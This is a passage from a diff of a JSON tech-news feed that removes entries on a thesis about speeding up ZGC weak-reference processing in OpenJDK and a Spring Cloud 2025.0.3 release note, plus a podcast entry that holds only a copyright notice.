20%-rounds with a System.gc() after each round, spreading reference processing across multiple cycles.\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tBoth benchmarks use -XX:+UseZGC, a 100 GB heap, and -XX:InitialTenuringThreshold=1 to promote objects quickly to the old generation where ZGC discovers and processes references. Each variant ran 250 measurement iterations on an exclusive AMD EPYC 9454P node (48 cores, 768 GiB RAM) on the UPPMAX Pelle supercomputer cluster, with four parallel instances pinned via taskset to isolated CPU sets to avoid inter-instance interference.\n\t\t\t\tResults\n\t\t\t\tNon-Strong Reference Processing Time\n\t\t\t\tThe metric most directly targeted by the optimisations is Concurrent Process Non-Strong, the wall-clock duration of ZGC's concurrent reference-processing phase.\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVariant\n\t\t\t\t\t\t\tSingle-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\tMulti-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tnone (baseline)\n\t\t\t\t\t\t\t996.9 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\t44.1 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tsep_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t943.8 ms\n\t\t\t\t\t\t\t−5 %\n\t\t\t\t\t\t\t44.1 ms\n\t\t\t\t\t\t\t0 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tdyn_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t639.1 ms\n\t\t\t\t\t\t\t−36 %\n\t\t\t\t\t\t\t27.5 ms\n\t\t\t\t\t\t\t−38 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tclear_path_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t923.7 ms\n\t\t\t\t\t\t\t−7 %\n\t\t\t\t\t\t\t41.5 ms\n\t\t\t\t\t\t\t−6 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tclear_path_dyn\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t187.9 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−81 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t18.8 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−57 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tall\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t184.4 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−81 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t18.7 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−57 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tweak_fields\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t484.6 ms\n\t\t\t\t\t\t\t−51 %\n\t\t\t\t\t\t\t35.8 ms\n\t\t\t\t\t\t\t−19 %\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tThe clear_path_dyn and all variants are the clear leaders. The sep_only variant shows that the enqueueing stage itself is not the dominant bottleneck: routing queue-less references away from the ReferenceHandler thread has negligible effect on processing time in these queue-less benchmarks. However, it should reduce pending-list traversal in the ReferenceHandler thread and might improve branch prediction in the processing step for workloads with a mix of queue-less and queue-registered references.\n\t\t\t\tTotal GC Collection Time\n\t\t\t\tThe 81% reduction in the targeted phase translates to a more modest improvement in total major collection time, because non-strong processing accounts for only 14.7% of baseline major-collection time in the single-object benchmark and 4.5% in the multi-object benchmark. Furthermore, these improvements should be taken with a grain of salt as the distributions of total collection time overlap substantially across variants, only the weak_fields variant shows a clear separation from the baseline.\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVariant\n\t\t\t\t\t\t\tSingle-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\tMulti-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tnone\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t6 958 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\t982 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tall\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t6 377 ms\n\t\t\t\t\t\t\t−8 %\n\t\t\t\t\t\t\t967 ms\n\t\t\t\t\t\t\t−2 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tweak_fields\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t4 136 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−41 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t708 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−28 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\tweak_fields reduces major collection time by 41% and old-generation time by 37% in the single-object benchmark (28% and 31% in the multi-object benchmark). This improvement spans every phase - concurrent mark, relocate, young generation - because eliminating millions of WeakReference objects from the heap reduces the GC workload across the board, not only in the reference-processing phase.\n\t\t\t\tMemory Usage\n\t\t\t\tThe dynamic array incurs a meaningful auxiliary GCr memory cost in the single-object benchmark, where 20 million entries are live simultaneously:\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVariant\n\t\t\t\t\t\t\tAuxiliary GCr memory (single-object, median max)\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tnone\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t120 MB\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tdyn_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t308 MB (+157%)\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tclear_path_dyn\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t1 268 MB (+957%)\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tall\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t884 MB (+637%)\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tweak_fields\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t446 MB (+272%)\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tIn the multi-object benchmark the absolute numbers are smaller (292 MB baseline) and the relative overheads contract sharply, because the reference population is smaller.\n\t\t\t\t\n\t\t\t\t\tall saves ~30% of auxiliary GCr memory over clear_path_dyn by not needing to store the reference address in each array entry (the skip-enqueue separation routes queue-less references to a separate list, so the address field is not needed there) making it the more attractive pipeline variant overall.\n\t\t\t\tJava heap occupancy is essentially identical across all WeakReference variants (~1 720 MB in the single-object benchmark). weak_fields reduces this to 806 MB (−53%), directly reflecting the absence of the WeakReference objects.\n\t\t\t\tKey Takeaways\n\t\t\t\tThe results suggest that weak-reference overhead behaves more like a representation problem than a pipeline problem. Reducing it meaningfully appears to require reconsidering how weak semantics is encoded in the language, not merely how the resulting objects are processed once they have been allocated.\n\t\t\t\tThe clear_path_dyn and all combinations demonstrate that a carefully designed interaction between cache-friendly data structures and simplified per-reference logic can achieve large reductions in the targeted phase. Yet even an 81% reduction only an 8% reduction in collection time under conditions engineered to maximise it. The @weak field annotation, by contrast, eliminates the objects responsible for that overhead from every phase of every cycle, delivering 41% major-collection-time savings and 53% heap savings in the single-object benchmark.\n\t\t\t\tThis finding is consistent with how weak semantics is implemented across the broader language ecosystem. Go's weak.Pointer, C++'s std::weak_ptr, and .NET's WeakReference<T> all treat weak reachability and cleanup notification as separate concerns. The @weak annotation brings Java's callback-less weak-reference cost closer to that model.\n\t\t\t\tThe weak_fields implementation currently touches 27 files (compared to at most 10 for the most complex pipeline variant) and remains a prototype. Several paths forward are described in the thesis, including integration of one or more pipeline variants into the OpenJDK project.\n\t\t\t\t\n\t\t\t\tThe thesis is available at Uppsala University's DiVA portal. The full codebase is a fork of OpenJDK with all four mechanisms implemented as source-file overlays under patches/, together with build and benchmarking scripts. The complete measurement dataset is published on Zenodo.\n\t\t\t\tI would like to extend my sincere thanks to Stefan Johansson and Tobias Wrigstad for their guidance throughout the project, and to everyone at the Oracle Stockholm office for their support and generosity in sharing their expertise.",
-    "url": "https://inside.java/2026/06/11/thesis-simplify-weak-reference-processing-zgc/",
-    "category": "프로그래밍 언어",
-    "source": "Inside Java",
-    "author": "Fredrik Hammarberg (guest)",
-    "pubDate": "2026-06-11T00:00:00.000Z",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Java"
-    ]
-  },
-  {
-    "id": "https://spring.io/blog/2026/06/11/a-bootiful-podcast-rob-winch-answers-everything",
-    "title": "A Bootiful Podcast: Spring Security lead Rob Winch answers some security questions for me",
-    "summary": "Copyright © 2005 - 2026 Broadcom. All Rights Reserved. The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries. Terms of Use • Privacy • Trademark Guidelines Apache®, Apache Tomcat®, Apach",
-    "aiSummary": "제공해주신 기사 본문은 기술적인 내용이나 특정 프로젝트에 관한 정보가 아니라 Broadcom 사의 저작권 정책 및 상표권 관련 고지 사항으로 구성되어 있습니다. 따라서 별도의 기사 핵심 내용을 요약할 정보가 포함되어 있지 않습니다.",
-    "cleanContent": "Copyright © 2005 - 2026 Broadcom. All Rights Reserved. The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries. Terms of Use • Privacy • Trademark Guidelines Apache®, Apache Tomcat®, Apache Kafka®, Apache Cassandra™, and Apache Geode™ are trademarks or registered trademarks of the Apache Software Foundation in the United States and/or other countries. Java™, Java™ SE, Java™ EE, and OpenJDK™ are trademarks of Oracle and/or its affiliates. Kubernetes® is a registered trademark of the Linux Foundation in the United States and other countries. Linux® is the registered trademark of Linus Torvalds in the United States and other countries. Windows® and Microsoft® Azure are registered trademarks of Microsoft Corporation. “AWS” and “Amazon Web Services” are trademarks or registered trademarks of Amazon.com Inc. or its affiliates. All other trademarks and copyrights are property of their respective owners and are only mentioned for informative purposes. Other names may be trademarks of their respective owners.",
-    "url": "https://spring.io/blog/2026/06/11/a-bootiful-podcast-rob-winch-answers-everything",
-    "category": "백엔드",
-    "source": "Spring Engineering",
-    "author": "joshlong",
-    "pubDate": "Thu, 11 Jun 2026 00:00:00 GMT",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Spring",
-      "Java"
-    ]
-  },
-  {
-    "id": "https://spring.io/blog/2026/06/11/spring-cloud-2025-0-3-aka-northfields-has-been-released",
-    "title": "Spring Cloud 2025.0.3 (aka Northfields) Has Been Released",
-    "summary": "On behalf of the community, I am pleased to announce that the General Availability (RELEASE) of the Spring Cloud 2025.0.3 Release Train is available today. The release can be found in Maven Central. Y",
-    "aiSummary": "Spring Cloud 2025.0.3 버전인 Northfields가 정식 출시되었습니다. 이번 릴리스는 Spring Cloud 2025.0.x 라인의 마지막 오픈 소스 버전이며 2026년 6월 30일에 오픈 소스 지원이 종료될 예정입니다. 해당 버전은 Spring Boot 3.5.15를 기반으로 하며 Maven Central을 통해 배포됩니다.\n\n주요 변경 사항으로는 Spring Cloud Gateway에서의 CVE-2026-47825 취약점 해결을 포함하여 빈 경로 접두사 지원 추가와 MVC ProxyExchange의 URI 템플릿 관측 가능성 개선이 포함되었습니다.\n\n이번 업데이트에는 Spring Cloud Bus, Spring Cloud Openfeign, Spring Cloud Circuitbreaker, Spring Cloud Kubernetes, Spring Cloud Function 등 다수의 모듈이 포함되었습니다. 상세한 모듈별 버전 정보는 릴리스 노트를 통해 확인할 수 있으며 Maven 또는 Gradle을 통해 프로젝트 의존성에 반영할 수 있습니다.",
-    "cleanContent": "On behalf of the community, I am pleased to announce that the General Availability (RELEASE) of the Spring Cloud 2025.0.3 Release Train is available today. The release can be found in Maven Central. You can check out the 2025.0.3 release notes for more information.\nNotable Changes in the 2025.0.3 Release Train\nThis will be the final open source release of the Spring Cloud 2025.0.x release train.  Open source support for SPring Cloud 2025.0.x will end on June 30th, 2026.\nThis release is based on Spring Boot 3.5.15.\nSpring Cloud Gateway\n\nFix for CVE-2026-47825\nAdd support for empty path prefixes (#3201)\nMVC ProxyExchange provides observability of URI template (#3458)\n\nThe following modules were updated as part of 2025.0.3:\n\n\n\nModule\nVersion\nIssues\n\n\n\n\nSpring Cloud Bus\n4.3.2\n(issues)\n\n\nSpring Cloud Openfeign\n4.3.3\n(issues)\n\n\nSpring Cloud Circuitbreaker\n3.3.3\n(issues)\n\n\nSpring Cloud Kubernetes\n3.3.3\n(issues)\n\n\nSpring Cloud Function\n4.3.4\n(issues)\n\n\nSpring Cloud Task\n3.3.2\n(issues)\n\n\nSpring Cloud Stream\n4.3.3\n(issues)\n\n\nSpring Cloud Starter Build\n2025.0.3\n(issues)\n\n\nSpring Cloud Vault\n4.3.3\n(issues)\n\n\nSpring Cloud Commons\n4.3.3\n(issues)\n\n\nSpring Cloud Netflix\n4.3.3\n(issues)\n\n\nSpring Cloud Consul\n4.3.3\n(issues)\n\n\nSpring Cloud Gateway\n4.3.5\n(issues)\n\n\nSpring Cloud Zookeeper\n4.3.3\n(issues)\n\n\nSpring Cloud Config\n4.3.4\n(issues)\n\n\nSpring Cloud Build\n4.3.4\n(issues)\n\n\nSpring Cloud Contract\n4.3.4\n(issues)\n\n\n\nAs always, we welcome feedback on GitHub, on Gitter, on Stack Overflow, or on Twitter.\nTo get started with Maven with a BOM (dependency management only):\n\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.cloud</groupId>\n            <artifactId>spring-cloud-dependencies</artifactId>\n            <version>2025.0.3</version>\n            <type>pom</type>\n            <scope>import</scope>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-config</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>\n    </dependency>\n    ...\n</dependencies>\n\nor with Gradle:\nbuildscript {\ndependencies {\nclasspath \"io.spring.gradle:dependency-management-plugin:1.0.2.RELEASE\"\n}\n}\n\n\n\napply plugin: \"io.spring.dependency-management\"\n\ndependencyManagement {\nimports {\nmavenBom 'org.springframework.cloud:spring-cloud-dependencies:2025.0.3'\n}\n}\n\ndependencies {\ncompile 'org.springframework.cloud:spring-cloud-starter-config'\ncompile 'org.springframework.cloud:spring-cloud-starter-netflix-eureka-client'\n...\n}",
-    "url": "https://spring.io/blog/2026/06/11/spring-cloud-2025-0-3-aka-northfields-has-been-released",
-    "category": "백엔드",
-    "source": "Spring Releases",
-    "author": "ryanjbaxter",
-    "pubDate": "Thu, 11 Jun 2026 00:00:00 GMT",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Spring",
-      "Java"
     ]
   }
 ]
